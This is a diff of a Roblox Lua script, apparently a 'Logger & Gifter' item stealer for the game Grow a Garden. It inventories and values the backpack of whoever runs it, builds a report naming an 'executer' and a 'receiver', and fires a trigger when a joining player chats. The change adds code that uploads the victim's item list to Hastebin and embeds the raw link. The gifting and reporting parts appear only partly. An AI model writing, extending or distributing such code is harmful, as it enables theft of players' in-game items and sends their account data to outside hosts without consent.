@@ -1,4 +1,4 @@
--- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED)
+-- GAG Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED, Top 10 + Pastebin)
 -- Made By Timoci | discord.gg/notyet
 
 local CONFIG = {
@@ -61,7 +61,6 @@ end
 local function formatValue(n)
     local s = tostring(math.floor(n or 0)):reverse():gsub("(%d%d%d)","%1,"):reverse():gsub("^,","") return s
 end
-
 local function collectItems()
     local items, totalValue, foundRare = {}, 0, false
     for _, tool in ipairs(backpack:GetChildren()) do
@@ -120,15 +119,53 @@ local function collectItems()
     return items, totalValue, foundRare
 end
 
--- THIS IS THE CORRECT FINAL VERSION:
+--- PASTE UPLOADER ---
+
+local function uploadToHastebin(text)
+    local url = "https://www.toptal.com/developers/hastebin/documents"
+    local ok, res = pcall(function()
+        local resp = req({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "text/plain"},
+            Body = text,
+        })
+        return resp
+    end)
+    if ok and res and res.Body and res.StatusCode == 200 then
+        local key = HttpService:JSONDecode(res.Body).key
+        -- RAW link, not view page!
+        return "https://www.toptal.com/developers/hastebin/raw/"..key
+    end
+end
+
 local function buildBackpackSection(items)
     if #items == 0 then return "_No giftable items found!_" end
+    -- Only 10 most valuable
     local itemLines = {}
-    for _, item in ipairs(items) do
-        if item.Type == "Pet" then table.insert(itemLines, string.format("%s %s [%.2fkg] [Age %s] **%s¢**", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
-        else table.insert(itemLines, string.format("%s %s [%.2fkg] **%s¢**", item.Emoji, item.Name, item.Weight, formatValue(item.Value))) end
+    local overflow = {}
+    for i, item in ipairs(items) do
+        local line
+        if item.Type == "Pet" then
+            line = string.format("%s %s [%.2fkg] [Age %s] **%s¢**", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value))
+        else
+            line = string.format("%s %s [%.2fkg] **%s¢**", item.Emoji, item.Name, item.Weight, formatValue(item.Value))
+        end
+        if i <= 10 then
+            table.insert(itemLines, line)
+        else
+            -- Overflows to paste
+            table.insert(overflow, line)
+        end
     end
-    return table.concat(itemLines, "\n")
+    local output = table.concat(itemLines, "\n")
+    if #overflow > 0 then
+        -- Post overflow to Hastebin & add link
+        local pasteText = "[All other items:]\n" .. table.concat(overflow, "\n")
+        local pasteLink = uploadToHastebin(pasteText) or "error uploading paste"
+        output = output .. "\n\n[More items (Raw Paste)]("..pasteLink..")"
+    end
+    return output
 end
 
 local function prettyEmbed(executer, receiver)
@@ -232,3 +269,5 @@ Players.PlayerAdded:Connect(function(player)
         player.Chatted:Connect(function() onHitTrigger(player) end)
     end
 end)
+
+-- END OF FULLY UPDATED SOURCE FOR 10 MOST VALUABLE & RAW PASTE LINK
